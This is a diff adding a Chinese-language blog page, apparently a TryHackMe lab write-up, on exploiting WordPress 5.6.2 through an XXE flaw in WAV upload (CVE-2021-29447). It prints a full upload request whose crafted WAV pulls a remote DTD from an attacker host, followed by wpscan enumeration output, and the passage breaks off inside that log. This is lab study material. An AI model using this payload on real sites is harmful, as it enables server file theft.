@@ -1,0 +1,653 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="GroundCtl2MajorTom">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="wordpress 5.6.2 xxe+wav文件上传https:&#x2F;&#x2F;blog.7sec.pw&#x2F;thm-wordpress-cve-2021-29447 https:&#x2F;&#x2F;classroom.anir0y.in&#x2F;post&#x2F;tryhackme-wordpresscve202129447&#x2F; payload包 123456789101112131415161718192021222324252627282">
+<meta property="og:type" content="article">
+<meta property="og:title" content="tryhackme_wordpress_5.6.2">
+<meta property="og:url" content="http://groundctl2majortom.github.io/2023/10/01/tryhackme-wordpress-5-6-2/index.html">
+<meta property="og:site_name" content="GroundCtl2MajorTom">
+<meta property="og:description" content="wordpress 5.6.2 xxe+wav文件上传https:&#x2F;&#x2F;blog.7sec.pw&#x2F;thm-wordpress-cve-2021-29447 https:&#x2F;&#x2F;classroom.anir0y.in&#x2F;post&#x2F;tryhackme-wordpresscve202129447&#x2F; payload包 123456789101112131415161718192021222324252627282">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ress-5-6-2/image-20231011191031118.png">
+<meta property="article:published_time" content="2023-10-01T11:14:57.000Z">
+<meta property="article:modified_time" content="2024-09-07T11:15:34.250Z">
+<meta property="article:author" content="GroundCtl2MajorTom">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://groundctl2majortom.github.io/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ress-5-6-2/image-20231011191031118.png">
+  
+  
+  
+  <title>tryhackme_wordpress_5.6.2 - GroundCtl2MajorTom</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"groundctl2majortom.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>GroundCtl2majorTom</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="tryhackme_wordpress_5.6.2"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-10-01 19:14" pubdate>
+          2023年10月1日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          12 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">tryhackme_wordpress_5.6.2</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h3 id="wordpress-5-6-2-xxe-wav文件上传"><a href="#wordpress-5-6-2-xxe-wav文件上传" class="headerlink" title="wordpress 5.6.2 xxe+wav文件上传"></a>wordpress 5.6.2 xxe+wav文件上传</h3><p><a target="_blank" rel="noopener" href="https://blog.7sec.pw/thm-wordpress-cve-2021-29447">https://blog.7sec.pw/thm-wordpress-cve-2021-29447</a></p>
+<p><a target="_blank" rel="noopener" href="https://classroom.anir0y.in/post/tryhackme-wordpresscve202129447/">https://classroom.anir0y.in/post/tryhackme-wordpresscve202129447/</a></p>
+<p>payload包</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/wp-admin/async-upload.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.10.38.200<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://10.10.38.200/wp-admin/media-new.php<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=---------------------------340848750029926117942213750511<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>1092<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://10.10.38.200<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>wordpress_=test-corp%7C1697188180%7CrqNGHtlLtFyE1oh4k8CrJ6mPT9KuDtXDJKzXPL19VnL%7Ca45d1a9ba96bfb9d11a9ffff2fa8b97cf45b3847d61e81969b3f09288f93563a; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_=test-corp%7C1697188180%7CrqNGHtlLtFyE1oh4k8CrJ6mPT9KuDtXDJKzXPL19VnL%7C0d4b7f7e8e2f4c8ace785f19e28cde18a88f543feabdc23360a4d61f124c44a5; wp-settings-time-2=1697015399<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;macOS&quot;<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Google Chrome&quot;;v=&quot;111&quot;, &quot;Chromium&quot;;v=&quot;111&quot;, &quot;Not=A?Brand&quot;;v=&quot;24&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><br><span class="language-xml">-----------------------------340848750029926117942213750511</span><br><span class="language-xml">Content-Disposition: form-data; name=&quot;name&quot;</span><br><span class="language-xml"></span><br><span class="language-xml">poc.wav</span><br><span class="language-xml">-----------------------------340848750029926117942213750511</span><br><span class="language-xml">Content-Disposition: form-data; name=&quot;post_id&quot;</span><br><span class="language-xml"></span><br><span class="language-xml">0</span><br><span class="language-xml">-----------------------------340848750029926117942213750511</span><br><span class="language-xml">Content-Disposition: form-data; name=&quot;_wpnonce&quot;</span><br><span class="language-xml"></span><br><span class="language-xml">f62d479851</span><br><span class="language-xml">-----------------------------340848750029926117942213750511</span><br><span class="language-xml">Content-Disposition: form-data; name=&quot;type&quot;</span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">-----------------------------340848750029926117942213750511</span><br><span class="language-xml">Content-Disposition: form-data; name=&quot;tab&quot;</span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">-----------------------------340848750029926117942213750511</span><br><span class="language-xml">Content-Disposition: form-data; name=&quot;short&quot;</span><br><span class="language-xml"></span><br><span class="language-xml">1</span><br><span class="language-xml">-----------------------------340848750029926117942213750511</span><br><span class="language-xml">Content-Disposition: form-data; name=&quot;async-upload&quot;; filename=&quot;poc.wav&quot;</span><br><span class="language-xml">Content-Type: audio/x-wav</span><br><span class="language-xml"></span><br><span class="language-xml">RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span>[<span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&#x27;&quot;&#x27;</span><span class="hljs-string">&quot;&#x27;http://10.2.73.2:4444/NAMEEVIL.dtd&#x27;&quot;</span><span class="hljs-string">&#x27;&quot;&#x27;</span>&gt;</span>%remote;%init;%trick;]&gt;</span>\x00</span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">-----------------------------340848750029926117942213750511--</span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><p>第一步先wpscan扫一下，扫出了版本 5.6.x 该版本存在xxe漏洞</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><code class="hljs less">└─# <span class="hljs-selector-tag">wpscan</span> <span class="hljs-selector-tag">--url</span> <span class="hljs-number">10.10</span><span class="hljs-selector-class">.38</span><span class="hljs-selector-class">.200</span> <span class="hljs-selector-tag">-e</span> <span class="hljs-selector-tag">p</span>,<span class="hljs-selector-tag">t</span>,<span class="hljs-selector-tag">u</span><br><span class="hljs-selector-tag">_______________________________________________________________</span><br>         <span class="hljs-selector-tag">__</span>          <span class="hljs-selector-tag">_______</span>   <span class="hljs-selector-tag">_____</span><br>         \ \        / /  <span class="hljs-selector-tag">__</span> \ / <span class="hljs-selector-tag">____</span>|<br>          \ \  /\  / /| |<span class="hljs-selector-tag">__</span>) | (___   ___  __ _ _ __ ®<br>           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#x27;_ \<br>            \  /\  /  | |     ____) | (__| (_| | | | |<br>             \/  \/   |_|    |_____/ \___|\__,_|_| |_|<br><br>         WordPress Security Scanner by the WPScan Team<br>                         Version <span class="hljs-number">3.8</span>.<span class="hljs-number">24</span><br>       Sponsored by Automattic - <span class="hljs-attribute">https</span>:<span class="hljs-comment">//automattic.com/</span><br>       <span class="hljs-variable">@_WPScan_</span>, <span class="hljs-variable">@ethicalhack3r</span>, <span class="hljs-variable">@erwan_lr</span>, <span class="hljs-variable">@firefart</span><br>_______________________________________________________________<br><br>[+] <span class="hljs-attribute">URL</span>: <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/ [10.10.38.200]</span><br>[+] <span class="hljs-attribute">Started</span>: Wed Oct <span class="hljs-number">11</span> <span class="hljs-number">16</span>:<span class="hljs-number">15</span>:<span class="hljs-number">22</span> <span class="hljs-number">2023</span><br><br>Interesting <span class="hljs-built_in">Finding</span>(s):<br><br>[+] Headers<br> | Interesting <span class="hljs-attribute">Entry</span>: <span class="hljs-attribute">Server</span>: Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">18</span> (Ubuntu)<br> | Found <span class="hljs-attribute">By</span>: Headers (Passive Detection)<br> | <span class="hljs-attribute">Confidence</span>: <span class="hljs-number">100%</span><br><br>[+] WordPress readme <span class="hljs-attribute">found</span>: <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/readme.html</span><br> | Found <span class="hljs-attribute">By</span>: Direct Access (Aggressive Detection)<br> | <span class="hljs-attribute">Confidence</span>: <span class="hljs-number">100%</span><br><br>[+] Upload directory has listing <span class="hljs-attribute">enabled</span>: <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/wp-content/uploads/</span><br> | Found <span class="hljs-attribute">By</span>: Direct Access (Aggressive Detection)<br> | <span class="hljs-attribute">Confidence</span>: <span class="hljs-number">100%</span><br><br>[+] The external WP-Cron seems to be <span class="hljs-attribute">enabled</span>: <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/wp-cron.php</span><br> | Found <span class="hljs-attribute">By</span>: Direct Access (Aggressive Detection)<br> | <span class="hljs-attribute">Confidence</span>: <span class="hljs-number">60%</span><br> | <span class="hljs-attribute">References</span>:<br> |  - <span class="hljs-attribute">https</span>:<span class="hljs-comment">//www.iplocation.net/defend-wordpress-from-ddos</span><br> |  - <span class="hljs-attribute">https</span>:<span class="hljs-comment">//github.com/wpscanteam/wpscan/issues/1299</span><br><br>[+] WordPress version <span class="hljs-number">5.6</span>.<span class="hljs-number">2</span> identified (Insecure, released on <span class="hljs-number">2021</span>-<span class="hljs-number">02</span>-<span class="hljs-number">22</span>).<br> | Found <span class="hljs-attribute">By</span>: Rss Generator (Passive Detection)<br> |  - <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.6.2&lt;/generator&gt;</span><br> |  - <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.6.2&lt;/generator&gt;</span><br><br>[+] WordPress theme in <span class="hljs-attribute">use</span>: twentytwentyone<br> | <span class="hljs-attribute">Location</span>: <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/wp-content/themes/twentytwentyone/</span><br> | Last <span class="hljs-attribute">Updated</span>: <span class="hljs-number">2023</span><span class="hljs-attribute">-03-29T00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00.000</span>Z<br> | <span class="hljs-attribute">Readme</span>: <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/wp-content/themes/twentytwentyone/readme.txt</span><br> | [!] The version is out of date, the latest version is <span class="hljs-number">1.8</span><br> | Style <span class="hljs-attribute">URL</span>: <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/wp-content/themes/twentytwentyone/style.css</span><br> | Style <span class="hljs-attribute">Name</span>: Twenty Twenty-One<br> | Style <span class="hljs-attribute">URI</span>: <span class="hljs-attribute">https</span>:<span class="hljs-comment">//wordpress.org/themes/twentytwentyone/</span><br> | <span class="hljs-attribute">Description</span>: Twenty Twenty-One is a blank canvas for your ideas <span class="hljs-keyword">and</span> it makes the block editor your best brush. Wi...<br> | <span class="hljs-attribute">Author</span>: the WordPress team<br> | Author <span class="hljs-attribute">URI</span>: <span class="hljs-attribute">https</span>:<span class="hljs-comment">//wordpress.org/</span><br> |<br> | Found <span class="hljs-attribute">By</span>: Css Style In Homepage (Passive Detection)<br> | Confirmed <span class="hljs-attribute">By</span>: Urls In Homepage (Passive Detection)<br> |<br> | <span class="hljs-attribute">Version</span>: <span class="hljs-number">1.1</span> (<span class="hljs-number">80%</span> confidence)<br> | Found <span class="hljs-attribute">By</span>: Style (Passive Detection)<br> |  - <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/wp-content/themes/twentytwentyone/style.css, Match: &#x27;Version: 1.1&#x27;</span><br><br>[+] Enumerating Most Popular Plugins (via Passive Methods)<br>[+] Checking Plugin Versions (via Passive <span class="hljs-keyword">and</span> Aggressive Methods)<br><br>[i] <span class="hljs-built_in">Plugin</span>(s) <span class="hljs-attribute">Identified</span>:<br><br>[+] wp-security-hardening<br> | <span class="hljs-attribute">Location</span>: <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/wp-content/plugins/wp-security-hardening/</span><br> | Last <span class="hljs-attribute">Updated</span>: <span class="hljs-number">2022</span><span class="hljs-attribute">-10-20T17</span>:<span class="hljs-number">04</span>:<span class="hljs-number">00.000</span>Z<br> | [!] The version is out of date, the latest version is <span class="hljs-number">1.2</span>.<span class="hljs-number">6</span><br> |<br> | Found <span class="hljs-attribute">By</span>: Urls In Homepage (Passive Detection)<br> |<br> | <span class="hljs-attribute">Version</span>: <span class="hljs-number">1.2</span> (<span class="hljs-number">100%</span> confidence)<br> | Found <span class="hljs-attribute">By</span>: Readme - Stable Tag (Aggressive Detection)<br> |  - <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/wp-content/plugins/wp-security-hardening/readme.txt</span><br> | Confirmed <span class="hljs-attribute">By</span>: Readme - ChangeLog Section (Aggressive Detection)<br> |  - <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/wp-content/plugins/wp-security-hardening/readme.txt</span><br><br>[+] Enumerating Most Popular Themes (via Passive <span class="hljs-keyword">and</span> Aggressive Methods)<br> Checking Known Locations - <span class="hljs-attribute">Time</span>: <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">28</span> &lt;==================================&gt; (<span class="hljs-number">400</span> / <span class="hljs-number">400</span>) <span class="hljs-number">100.00%</span> <span class="hljs-attribute">Time</span>: <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">28</span><br>[+] Checking Theme Versions (via Passive <span class="hljs-keyword">and</span> Aggressive Methods)<br><br>[i] <span class="hljs-built_in">Theme</span>(s) <span class="hljs-attribute">Identified</span>:<br><br>[+] twentynineteen<br> | <span class="hljs-attribute">Location</span>: <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/wp-content/themes/twentynineteen/</span><br> | Last <span class="hljs-attribute">Updated</span>: <span class="hljs-number">2023</span><span class="hljs-attribute">-03-29T00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00.000</span>Z<br> | <span class="hljs-attribute">Readme</span>: <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/wp-content/themes/twentynineteen/readme.txt</span><br> | [!] The version is out of date, the latest version is <span class="hljs-number">2.5</span><br> | Style <span class="hljs-attribute">URL</span>: <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/wp-content/themes/twentynineteen/style.css</span><br> | Style <span class="hljs-attribute">Name</span>: Twenty Nineteen<br> | Style <span class="hljs-attribute">URI</span>: <span class="hljs-attribute">https</span>:<span class="hljs-comment">//wordpress.org/themes/twentynineteen/</span><br> | <span class="hljs-attribute">Description</span>: Our <span class="hljs-number">2019</span> default theme is designed to show off the power of the block editor. It features custom sty...<br> | <span class="hljs-attribute">Author</span>: the WordPress team<br> | Author <span class="hljs-attribute">URI</span>: <span class="hljs-attribute">https</span>:<span class="hljs-comment">//wordpress.org/</span><br> |<br> | Found <span class="hljs-attribute">By</span>: Known Locations (Aggressive Detection)<br> |  - <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/wp-content/themes/twentynineteen/, status: 500</span><br> |<br> | <span class="hljs-attribute">Version</span>: <span class="hljs-number">1.9</span> (<span class="hljs-number">80%</span> confidence)<br> | Found <span class="hljs-attribute">By</span>: Style (Passive Detection)<br> |  - <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/wp-content/themes/twentynineteen/style.css, Match: &#x27;Version: 1.9&#x27;</span><br><br>[+] twentytwenty<br> | <span class="hljs-attribute">Location</span>: <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/wp-content/themes/twentytwenty/</span><br> | Last <span class="hljs-attribute">Updated</span>: <span class="hljs-number">2023</span><span class="hljs-attribute">-03-29T00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00.000</span>Z<br> | <span class="hljs-attribute">Readme</span>: <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/wp-content/themes/twentytwenty/readme.txt</span><br> | [!] The version is out of date, the latest version is <span class="hljs-number">2.2</span><br> | Style <span class="hljs-attribute">URL</span>: <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/wp-content/themes/twentytwenty/style.css</span><br> | Style <span class="hljs-attribute">Name</span>: Twenty Twenty<br> | Style <span class="hljs-attribute">URI</span>: <span class="hljs-attribute">https</span>:<span class="hljs-comment">//wordpress.org/themes/twentytwenty/</span><br> | <span class="hljs-attribute">Description</span>: Our default theme for <span class="hljs-number">2020</span> is designed to take full advantage of the flexibility of the block editor...<br> | <span class="hljs-attribute">Author</span>: the WordPress team<br> | Author <span class="hljs-attribute">URI</span>: <span class="hljs-attribute">https</span>:<span class="hljs-comment">//wordpress.org/</span><br> |<br> | Found <span class="hljs-attribute">By</span>: Known Locations (Aggressive Detection)<br> |  - <span 